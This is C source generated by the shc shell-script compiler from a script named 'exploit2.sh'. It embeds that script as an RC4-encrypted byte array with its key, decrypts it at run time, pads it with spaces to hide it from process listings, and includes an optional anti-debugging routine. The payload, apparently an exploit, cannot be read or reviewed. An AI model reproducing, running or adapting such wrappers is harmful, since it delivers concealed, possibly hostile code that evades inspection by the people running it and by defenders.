#if 0
	shc Version 3.9.6, Generic Shell Script Compiler
	GNU GPL Version 3 Md Jahidul Hamid <jahidulhamid@yahoo.com>

	shc -rvf exploit2.sh 
#endif

static  char data [] = 
#define      date_z	1
#define      date	((&data[0]))
	"\063"
#define      shll_z	8
#define      shll	((&data[3]))
	"\311\300\321\262\306\312\154\136\246\320\317"
#define      xecc_z	15
#define      xecc	((&data[15]))
	"\233\160\210\234\317\253\057\064\364\027\146\354\167\366\215\372"
	"\371\231\040\140"
#define      lsto_z	1
#define      lsto	((&data[32]))
	"\057"
#define      inlo_z	3
#define      inlo	((&data[33]))
	"\264\343\072"
#define      msg1_z	65
#define      msg1	((&data[50]))
	"\231\205\023\235\230\071\253\101\173\174\242\105\075\161\151\210"
	"\336\376\142\332\342\130\265\105\031\025\151\115\324\366\254\076"
	"\015\354\033\037\374\275\221\320\263\053\342\315\240\210\361\111"
	"\177\373\375\247\130\020\132\340\246\352\237\256\025\072\144\000"
	"\345\254\321\106\352\122\145\037\005\162\012\027\010\232\121\241"
	"\012\025\074\173\235\134\333\022\231"
#define      rlax_z	1
#define      rlax	((&data[125]))
	"\153"
#define      tst1_z	22
#define      tst1	((&data[128]))
	"\341\014\010\372\045\355\163\334\317\125\253\016\341\035\321\120"
	"\157\127\152\002\135\271\035\304\051\365\251"
#define      opts_z	1
#define      opts	((&data[153]))
	"\031"
#define      pswd_z	256
#define      pswd	((&data[197]))
	"\246\360\016\030\221\031\056\315\224\314\052\160\336\304\033\061"
	"\217\140\244\063\101\261\135\067\132\037\145\257\044\020\201\313"
	"\000\217\343\222\251\022\140\076\336\213\256\064\237\016\051\305"
	"\310\257\176\367\372\325\170\201\042\257\161\266\253\032\224\320"
	"\043\275\376\042\234\377\266\256\222\266\342\061\305\014\367\215"
	"\274\166\204\266\113\375\067\156\254\251\044\127\304\271\050\347"
	"\166\046\012\023\045\300\302\270\167\245\351\074\261\341\312\155"
	"\127\117\044\242\114\134\020\371\005\065\121\311\357\171\261\145"
	"\237\273\171\305\174\074\175\363\341\146\060\222\107\372\000\237"
	"\111\044\101\225\200\122\216\206\207\340\117\166\131\001\334\370"
	"\274\126\276\071\222\073\055\163\242\135\006\352\127\007\211\241"
	"\054\312\067\255\035\306\063\244\246\203\033\377\204\370\370\101"
	"\117\266\172\341\362\247\125\224\004\134\176\134\143\010\376\217"
	"\322\065\074\360\373\160\224\241\363\260\241\167\250\231\270\367"
	"\120\062\331\102\332\057\327\336\213\126\073\356\136\071\176\061"
	"\156\272\041\152\053\266\013\036\146\254\225\017\106\115\007\226"
	"\177\341\331\132\020\260\070\233\006\164\212\145\256\011\226\034"
	"\304\267\206\357\156\222\015\324\077\242\344\205\357\354\034\157"
	"\315\365\311\335\246\002\171\255\167\004\022\274\117\311\356\336"
	"\051\223\022\153\104\157\242\237\217\010\116\263\031\317\176\032"
	"\137\142\254\010\165\014\107\123\227\365\020\346\277\376\305\351"
	"\222\327\124\326\107\367\165\326\377\304\212\031\224\011\063\363"
#define      chk1_z	22
#define      chk1	((&data[511]))
	"\340\354\104\064\204\163\125\172\073\213\162\337\167\072\104\106"
	"\237\362\315\032\076\054\142\240\304\357\044\071\104\153\371\103"
#define      msg2_z	19
#define      msg2	((&data[542]))
	"\010\067\253\117\263\040\107\016\026\071\337\204\263\275\317\013"
	"\077\162\013\347\136\304\356\056\041\045\056"
#define      tst2_z	19
#define      tst2	((&data[568]))
	"\172\271\173\131\371\026\175\110\201\041\024\300\176\234\152\135"
	"\035\024\242\351\015\154\156"
#define      text_z	2297
#define      text	((&data[791]))
	"\005\107\257\072\313\351\176\066\342\301\147\304\226\157\373\102"
	"\276\052\144\344\130\112\224\240\304\115\033\063\162\166\236\170"
	"\275\115\262\211\066\061\300\031\362\047\335\211\227\331\314\126"
	"\003\060\072\134\173\317\375\100\035\030\163\220\217\021\010\115"
	"\137\273\327\226\354\227\257\337\277\214\150\126\146\065\255\151"
	"\146\350\305\341\267\302\041\325\333\224\145\153\246\155\270\005"
	"\050\217\234\024\047\113\364\346\330\135\075\076\222\352\250\370"
	"\323\156\331\212\061\373\140\014\220\305\167\066\062\060\074\133"
	"\300\330\160\347\044\144\316\375\301\013\074\124\366\344\114\312"
	"\122\046\124\203\041\265\220\261\172\010\350\255\071\044\010\371"
	"\375\171\341\042\335\257\037\237\273\133\363\262\100\077\174\222"
	"\146\321\026\210\206\246\072\000\257\042\255\350\107\266\342\105"
	"\057\303\147\015\162\206\254\056\342\237\340\054\023\277\033\253"
	"\351\135\172\150\372\046\146\203\304\007\267\216\165\244\265\116"
	"\232\225\313\115\047\022\314\047\210\321\011\075\025\010\107\354"
	"\111\312\064\157\210\003\077\056\212\347\133\241\265\253\057\224"
	"\023\303\112\376\040\144\056\002\317\131\070\067\065\326\037\252"
	"\210\077\223\037\154\220\224\203\061\321\372\123\266\026\126\227"
	"\067\345\226\204\220\136\072\223\013\320\156\233\155\061\113\136"
	"\142\061\211\333\347\075\200\337\031\045\061\011\351\264\063\301"
	"\123\154\360\227\171\267\343\355\310\361\023\041\355\114\153\211"
	"\006\346\062\003\140\136\212\061\260\363\311\371\301\045\004\247"
	"\356\077\270\156\052\216\316\263\067\306\336\340\142\206\251\232"
	"\365\047\127\160\201\031\001\306\220\311\352\031\050\351\002\075"
	"\207\220\075\271\253\377\155\247\146\124\361\211\305\132\006\150"
	"\320\344\057\140\002\171\060\365\105\254\066\106\115\306\234\254"
	"\211\274\323\210\116\077\107\034\152\175\102\060\374\237\320\262"
	"\115\322\252\130\201\176\122\224\072\376\377\252\361\026\262\132"
	"\356\012\166\375\226\260\002\044\356\253\261\024\341\226\221\012"
	"\225\347\051\151\322\155\342\217\343\054\152\016\121\024\056\335"
	"\043\337\135\045\206\146\122\142\031\027\121\101\263\326\161\351"
	"\022\357\311\227\177\321\074\214\012\213\105\231\036\027\376\175"
	"\041\164\011\170\363\254\155\027\253\267\226\033\070\104\205\315"
	"\313\123\045\206\120\163\001\244\112\163\254\335\241\075\032\167"
	"\050\150\167\074\157\126\163\355\231\124\351\340\132\355\250\033"
	"\037\051\224\150\023\007\127\246\366\133\370\276\033\011\254\215"
	"\167\320\251\043\017\124\204\375\105\040\165\206\003\275\204\011"
	"\131\304\060\370\360\026\234\365\120\062\345\051\064\215\035\026"
	"\261\326\332\057\013\210\345\033\226\254\310\075\265\266\212\377"
	"\316\317\315\070\347\025\346\217\230\322\163\215\034\373\372\306"
	"\115\014\266\103\012\070\176\003\273\177\343\010\127\366\262\117"
	"\160\210\254\221\200\215\314\073\156\254\053\201\214\111\242\121"
	"\234\071\156\254\321\035\322\203\047\004\027\341\150\247\133\001"
	"\165\026\210\150\022\032\301\041\232\156\301\130\105\143\311\252"
	"\367\267\013\376\020\320\320\301\026\040\243\005\173\372\145\205"
	"\306\102\106\117\350\222\064\200\057\372\021\245\317\132\014\020"
	"\100\046\242\233\321\264\255\332\062\216\320\140\370\376\025\235"
	"\027\015\114\361\105\177\117\106\236\050\213\020\215\066\142\312"
	"\331\213\375\221\325\336\265\050\235\055\126\140\351\221\221\000"
	"\117\203\031\311\011\206\027\102\047\233\023\213\313\323\236\333"
	"\015\113\010\237\222\162\070\147\011\101\056\224\125\370\260\123"
	"\135\210\162\002\216\327\161\205\024\337\352\125\070\257\346\313"
	"\002\365\237\132\213\136\372\035\031\361\277\220\274\026\314\362"
	"\322\003\014\171\266\377\337\266\072\031\100\305\175\111\342\062"
	"\250\321\244\335\364\006\263\071\252\020\336\236\116\357\031\246"
	"\310\346\033\327\165\162\126\027\160\177\300\232\204\234\124\020"
	"\030\135\371\221\340\145\037\337\137\131\277\136\322\107\005\323"
	"\057\242\145\054\137\352\234\067\177\265\116\306\101\006\277\100"
	"\077\024\353\176\070\361\307\370\250\135\156\363\152\370\310\001"
	"\132\015\073\122\177\321\074\244\276\255\217\323\031\356\267\113"
	"\031\050\003\223\230\201\037\145\364\266\231\111\334\153\156\141"
	"\316\113\066\300\376\134\002\325\037\200\326\273\314\244\000\334"
	"\070\122\214\214\101\025\254\016\367\121\246\222\246\175\306\045"
	"\227\215\252\377\235\306\203\062\227\376\215\100\373\277\076\360"
	"\153\215\164\007\275\050\345\033\300\145\120\135\050\046\145\100"
	"\011\103\240\005\050\137\014\123\137\354\352\047\355\016\270\300"
	"\014\136\004\225\332\061\332\067\234\072\165\102\313\073\221\257"
	"\063\214\303\061\072\200\054\112\161\216\070\325\013\276\076\164"
	"\136\050\204\116\152\345\236\354\355\264\055\374\121\212\374\146"
	"\011\337\056\114\126\014\064\046\060\307\210\331\234\000\352\062"
	"\073\353\273\354\247\171\344\355\064\171\327\176\302\114\074\323"
	"\055\202\316\256\302\215\253\226\304\023\063\163\076\203\106\332"
	"\111\260\262\355\103\320\071\241\146\026\254\355\130\266\172\312"
	"\071\371\072\024\165\371\257\354\026\264\002\043\317\361\061\225"
	"\246\364\072\344\320\135\177\274\111\142\003\376\374\333\143\347"
	"\341\326\063\353\211\347\317\335\211\022\046\025\051\261\255\214"
	"\076\000\345\310\240\270\347\237\006\156\212\141\022\372\321\036"
	"\131\125\140\223\310\265\206\356\256\026\213\035\002\100\110\344"
	"\046\221\375\046\103\253\016\240\335\224\246\257\000\024\251\214"
	"\301\312\277\016\323\162\120\075\230\236\326\160\217\206\125\021"
	"\014\143\131\263\217\207\334\322\004\207\115\226\002\355\062\377"
	"\242\116\167\251\356\275\066\057\335\062\002\352\270\251\235\001"
	"\041\313\151\155\156\341\042\335\331\350\173\053\314\216\260\030"
	"\030\143\150\314\007\213\260\100\373\154\202\110\322\040\012\135"
	"\211\364\056\347\272\162\326\174\253\253\203\140\212\041\311\065"
	"\067\125\234\200\216\061\131\032\343\105\365\314\227\242\214\211"
	"\055\034\031\205\020\144\375\235\342\032\226\242\111\126\360\321"
	"\234\361\107\033\325\344\165\047\231\244\207\122\342\160\333\255"
	"\221\156\216\237\241\240\075\324\254\062\037\226\100\361\252\203"
	"\046\135\305\227\000\161\213\362\321\271\316\222\066\013\344\020"
	"\207\252\310\306\306\012\063\070\327\105\171\051\310\067\236\057"
	"\375\061\041\311\137\311\251\370\032\231\347\370\065\260\040\153"
	"\155\245\136\025\261\357\167\214\007\036\174\211\146\245\231\216"
	"\004\067\200\327\375\216\077\053\300\347\073\246\120\071\264\333"
	"\311\061\357\014\345\316\072\167\306\136\107\127\231\233\260\306"
	"\140\221\106\234\260\024\305\142\001\107\201\044\022\113\260\015"
	"\326\123\177\246\123\320\355\120\064\322\150\053\154\136\070\010"
	"\252\064\057\045\211\324\165\145\325\037\370\314\270\253\232\172"
	"\111\025\110\307\171\071\336\000\274\302\363\355\242\127\347\057"
	"\143\377\357\004\323\273\275\316\060\323\376\012\162\071\134\141"
	"\104\073\335\107\115\155\051\173\176\140\130\162\111\265\361\030"
	"\356\377\375\312\247\004\213\011\360\170\001\211\216\311\276\154"
	"\331\062\306\045\156\051\350\213\354\105\002\335\053\067\317\252"
	"\256\106\272\052\025\060\315\110\113\323\042\011\207\146\240\020"
	"\251\103\205\313\043\362\307\340\376\101\106\222\165\055\332\227"
	"\104\306\335\335\305\266\164\065\310\173\202\175\157\314\037\347"
	"\031\206\312\232\016\075\041\055\336\230\050\155\253\164\375\207"
	"\225\152\266\310\222\115\245\061\025\322\245\051\303\345\305\007"
	"\216\143\223\124\055\265\205\262\001\256\006\027\264\336\173\112"
	"\344\321\207\206\053\167\163\164\234\103\134\213\277\202\304\204"
	"\365\134\167\225\017\061\321\260\260\073\005\221\160\377\132\067"
	"\347\071\242\320\047\022\020\101\026\070\150\372\262\131\013\037"
	"\173\157\351\270\010\230\323\146\144\143\106\233\222\115\055\037"
	"\117\046\350\037\037\373\360\316\061\044\126\267\367\041\342\340"
	"\030\110\315\233\077\015\161\357\267\312\075\204\333\076\246\100"
	"\275\276\054\324\027\160\062\315\304\106\147\232\355\302\260\204"
	"\072\173\272\111\020\316\374\215\150\202\001\375\301\020\306\263"
	"\267\040\217\136\264\170\003\172\367\165\231\351\040\033\152\040"
	"\203\377\153\201\235\353\061\044\142\377\017\373\107\177\123\314"
	"\143\040\052\355\036\252\103\214\031\232\321\155\105\012\021\065"
	"\061\075\305\273\376\116\071\074\114\073\006\155\271\237\011\260"
	"\042\150\336\372\305\341\172\063\351\345\265\040\231\011\240\074"
	"\007\322\327\062\040\265\263\324\052\124\174\272\020\301\354\157"
	"\244\051\162\247\342\007\201\357\022\027\016\041\162\226\047\144"
	"\161\374\352\161\022\045\116\340\230\155\250\267\156\336\125\300"
	"\017\352\274\134\272\302\104\204\371\207\022\050\320\343\176\144"
	"\275\142\325\056\155\363\100\300\342\367\160\074\251\126\256\137"
	"\262\304\130\343\151\115\004\076\233\241\373\237\064\022\361\354"
	"\216\147\146\144\236\040\140\312\261\050\113\115\171\060\101\121"
	"\152\320\121\333\134\315\034\060\156\054\025\016\213\166\360\376"
	"\371\265\323\076\003\051\340\305\351\347\072\102\107\177\061\152"
	"\166\314\332\056\315\271\077\366\052\224\275\151\112\041\021\222"
	"\151\204\136\312\206\310\262\303\137\115\254\034\022\352\332\054"
	"\316\107\334\365\003\321\340\030\061\317\140\225\012\347\042\215"
	"\066\211\214\354\115\122\035\124\256\122\071\150\231\126\014\365"
	"\143\103\314\242\160\177\252\057\077\111\172\265\231\371\303\110"
	"\345\241\247\007\232\045\235\175\263\346\207\261\235\044\013\200"
	"\273\345\102\105\311\011\102\321\027\146\244\145\251\003\053\327"
	"\121\354\035\046\074\251\013\161\164\310\100\221\262\234\241\005"
	"\373\250\330\247\306\334\254\035\316\104\201\164\234\151\201\027"
	"\257\124\044\103\111\140\023\177\130\365\314\023\356\027\353\154"
	"\256\005\163\216\015\113\076\330\230\323\262\354\166\057\034\177"
	"\226\206\203\275\354\231\011\376\304\060\327\143\057\337\363\031"
	"\353\235\261\047\343\041\227\123\060\015\371\201\154\137\101\362"
	"\006\074\304\313\275\246\254\262\013\173\126\166\013\347\144\060"
	"\051\031\307\315\043\254\353\136\035\200\267\272\043\017\266\057"
	"\063\246\270\037\176\041\316\326\371\010\206\374\271\250\114\111"
	"\107\237\222\007\034\204\314\313\133\251\153\170\354\003\320\354"
	"\130\347\274\352\033\365\251\013\100\356\265\214\063\273\271\136"
	"\262\337\301\304\032\307\274\370\231\247\324\273\265\212\175\253"
	"\331\271\047\175\226\102\336\025\103\341\257\234\242\304\310\054"
	"\027\231\343\355\261\302\375\200\213\141\371\307\115\124\070\216"
	"\137\302\144\205\020\356\066\034\035\176\055\144\300\256\255\202"
	"\336\331\122\014\330\026\264\053\166\371\021\334\100\107\022\346"
	"\243\266\311\210\356\042\062\246\061\263\175\112\237\250\025\330"
	"\330\132\036\156\066\367\016\213\041\001\355\352\116\360\245\241"
	"\027\047\010\051\042\337\135\264\106\056\313\316\265\162\011\265"
	"\041\053\143\012\163\031\354\270\111\257\037\126\042\246\002\120"
	"\210\242\060\252\202\215\137\310\274\052\226\161\234\240\047\276"
	"\313\212\310\077\244\264\367\356\143\027\104\205\275\107\326\105"
	"\351\006\357\153\224\116\063\121\171\312\303\026\152\352\324\066"
	"\165\235\166\032\121\155\010\265\204\115\073\102\224\021\207\176"
	"\030\167\351\255\306\035\377\077\350\302\125\123\254\052\212\042"
	"\307\000\074\031\156\105\316\363\222\012\065\046\033\274\244\064"
	"\064\216\342\372\254\341\071\224\243\217\350\120\271\162\162\201"
	"\163\257\232\341\364\151\324\206\163\012\255\217\306\122\304\373"
	"\340\246\365\215\207\056\042\053\275\012\173\167\175\356\370\360"
	"\235\223\322\221\374\246\030\160\261\306\000\170\030\304\163\371"
	"\152\150\206\362\226\250\035\124\262\231\314\060\207\305\041\044"
	"\130\363\266\125\232\316\306\113\224\306\303\255\212\066\246\365"
	"\236\055\347\065\325\005\212\210\236\126\270\045\034\332\111\165"
	"\315\377\312\147"
#define      chk2_z	19
#define      chk2	((&data[3330]))
	"\142\127\047\221\314\327\243\006\221\305\240\126\216\067\241\146"
	"\326\321\173\203\236\166\020\341"/* End of data[] */;
#define      hide_z	4096
#define DEBUGEXEC	0	/* Define as 1 to debug execvp calls */
#define TRACEABLE	1	/* Define as 1 to enable ptrace the executable */
#define BUSYBOXON	0	/* Define as 1 to enable work with busybox */

/* rtc.c */

#include <sys/stat.h>
#include <sys/types.h>

#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

/* 'Alleged RC4' */

static unsigned char stte[256], indx, jndx, kndx;

/*
 * Reset arc4 stte. 
 */
void stte_0(void)
{
	indx = jndx = kndx = 0;
	do {
		stte[indx] = indx;
	} while (++indx);
}

/*
 * Set key. Can be used more than once. 
 */
void key(void * str, int len)
{
	unsigned char tmp, * ptr = (unsigned char *)str;
	while (len > 0) {
		do {
			tmp = stte[indx];
			kndx += tmp;
			kndx += ptr[(int)indx % len];
			stte[indx] = stte[kndx];
			stte[kndx] = tmp;
		} while (++indx);
		ptr += 256;
		len -= 256;
	}
}

/*
 * Crypt data. 
 */
void arc4(void * str, int len)
{
	unsigned char tmp, * ptr = (unsigned char *)str;
	while (len > 0) {
		indx++;
		tmp = stte[indx];
		jndx += tmp;
		stte[indx] = stte[jndx];
		stte[jndx] = tmp;
		tmp += stte[indx];
		*ptr ^= stte[tmp];
		ptr++;
		len--;
	}
}

/* End of ARC4 */

/*
 * Key with file invariants. 
 */
int key_with_file(char * file)
{
	struct stat statf[1];
	struct stat control[1];

	if (stat(file, statf) < 0)
		return -1;

	/* Turn on stable fields */
	memset(control, 0, sizeof(control));
	control->st_ino = statf->st_ino;
	control->st_dev = statf->st_dev;
	control->st_rdev = statf->st_rdev;
	control->st_uid = statf->st_uid;
	control->st_gid = statf->st_gid;
	control->st_size = statf->st_size;
	control->st_mtime = statf->st_mtime;
	control->st_ctime = statf->st_ctime;
	key(control, sizeof(control));
	return 0;
}

#if DEBUGEXEC
void debugexec(char * sh11, int argc, char ** argv)
{
	int i;
	fprintf(stderr, "shll=%s\n", sh11 ? sh11 : "<null>");
	fprintf(stderr, "argc=%d\n", argc);
	if (!argv) {
		fprintf(stderr, "argv=<null>\n");
	} else { 
		for (i = 0; i <= argc ; i++)
			fprintf(stderr, "argv[%d]=%.60s\n", i, argv[i] ? argv[i] : "<null>");
	}
}
#endif /* DEBUGEXEC */

void rmarg(char ** argv, char * arg)
{
	for (; argv && *argv && *argv != arg; argv++);
	for (; argv && *argv; argv++)
		*argv = argv[1];
}

void chkenv_end(void);

int chkenv(int argc)
{
	char buff[512];
	unsigned long mask, m;
	int l, a, c;
	char * string;
	extern char ** environ;

	mask = (unsigned long)getpid();
	stte_0();
	 key(&chkenv, (void*)&chkenv_end - (void*)&chkenv);
	 key(&data, sizeof(data));
	 key(&mask, sizeof(mask));
	arc4(&mask, sizeof(mask));
	sprintf(buff, "x%lx", mask);
	string = getenv(buff);
#if DEBUGEXEC
	fprintf(stderr, "getenv(%s)=%s\n", buff, string ? string : "<null>");
#endif
	l = strlen(buff);
	if (!string) {
		/* 1st */
		sprintf(&buff[l], "=%lu %d", mask, argc);
		putenv(strdup(buff));
		return 0;
	}
	c = sscanf(string, "%lu %d%c", &m, &a, buff);
	if (c == 2 && m == mask) {
		/* 3rd */
		rmarg(environ, &string[-l - 1]);
		return 1 + (argc - a);
	}
	return -1;
}

void chkenv_end(void){}

#if !TRACEABLE

#define _LINUX_SOURCE_COMPAT
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <unistd.h>

#if !defined(PTRACE_ATTACH) && defined(PT_ATTACH)
#	define PTRACE_ATTACH	PT_ATTACH
#endif
void untraceable(char * argv0)
{
	char proc[80];
	int pid, mine;

	switch(pid = fork()) {
	case  0:
		pid = getppid();
		/* For problematic SunOS ptrace */
#if defined(__FreeBSD__)
		sprintf(proc, "/proc/%d/mem", (int)pid);
#else
		sprintf(proc, "/proc/%d/as",  (int)pid);
#endif
		close(0);
		mine = !open(proc, O_RDWR|O_EXCL);
		if (!mine && errno != EBUSY)
			mine = !ptrace(PTRACE_ATTACH, pid, 0, 0);
		if (mine) {
			kill(pid, SIGCONT);
		} else {
			perror(argv0);
			kill(pid, SIGKILL);
		}
		_exit(mine);
	case -1:
		break;
	default:
		if (pid == waitpid(pid, 0, 0))
			return;
	}
	perror(argv0);
	_exit(1);
}
#endif /* !TRACEABLE */

char * xsh(int argc, char ** argv)
{
	char * scrpt;
	int ret, i, j;
	char ** varg;
	char * me = argv[0];
	if (me == NULL) { me = getenv("_"); }
	if (me == 0) { fprintf(stderr, "E: neither argv[0] nor $_ works."); exit(1); }

	ret = chkenv(argc);
	stte_0();
	 key(pswd, pswd_z);
	arc4(msg1, msg1_z);
	arc4(date, date_z);
	if (date[0] && (atoll(date)<time(NULL)))
		return msg1;
	arc4(shll, shll_z);
	arc4(inlo, inlo_z);
	arc4(xecc, xecc_z);
	arc4(lsto, lsto_z);
	arc4(tst1, tst1_z);
	 key(tst1, tst1_z);
	arc4(chk1, chk1_z);
	if ((chk1_z != tst1_z) || memcmp(tst1, chk1, tst1_z))
		return tst1;
	arc4(msg2, msg2_z);
	if (ret < 0)
		return msg2;
	varg = (char **)calloc(argc + 10, sizeof(char *));
	if (!varg)
		return 0;
	if (ret) {
		arc4(rlax, rlax_z);
		if (!rlax[0] && key_with_file(shll))
			return shll;
		arc4(opts, opts_z);
		arc4(text, text_z);
		arc4(tst2, tst2_z);
		 key(tst2, tst2_z);
		arc4(chk2, chk2_z);
		if ((chk2_z != tst2_z) || memcmp(tst2, chk2, tst2_z))
			return tst2;
		/* Prepend hide_z spaces to script text to hide it. */
		scrpt = malloc(hide_z + text_z);
		if (!scrpt)
			return 0;
		memset(scrpt, (int) ' ', hide_z);
		memcpy(&scrpt[hide_z], text, text_z);
	} else {			/* Reexecute */
		if (*xecc) {
			scrpt = malloc(512);
			if (!scrpt)
				return 0;
			sprintf(scrpt, xecc, me);
		} else {
			scrpt = me;
		}
	}
	j = 0;
#if BUSYBOXON
	varg[j++] = "busybox";
	varg[j++] = "sh";
#else
	varg[j++] = argv[0];		/* My own name at execution */
#endif
	if (ret && *opts)
		varg[j++] = opts;	/* Options on 1st line of code */
	if (*inlo)
		varg[j++] = inlo;	/* Option introducing inline code */
	varg[j++] = scrpt;		/* The script itself */
	if (*lsto)
		varg[j++] = lsto;	/* Option meaning last option */
	i = (ret > 1) ? ret : 0;	/* Args numbering correction */
	while (i < argc)
		varg[j++] = argv[i++];	/* Main run-time arguments */
	varg[j] = 0;			/* NULL terminated array */
#if DEBUGEXEC
	debugexec(shll, j, varg);
#endif
	execvp(shll, varg);
	return shll;
}

int main(int argc, char ** argv)
{
#if DEBUGEXEC
	debugexec("main", argc, argv);
#endif
#if !TRACEABLE
	untraceable(argv[0]);
#endif
	argv[1] = xsh(argc, argv);
	fprintf(stderr, "%s%s%s: %s\n", argv[0],
		errno ? ": " : "",
		errno ? strerror(errno) : "",
		argv[1] ? argv[1] : "<null>"
	);
	return 1;
}
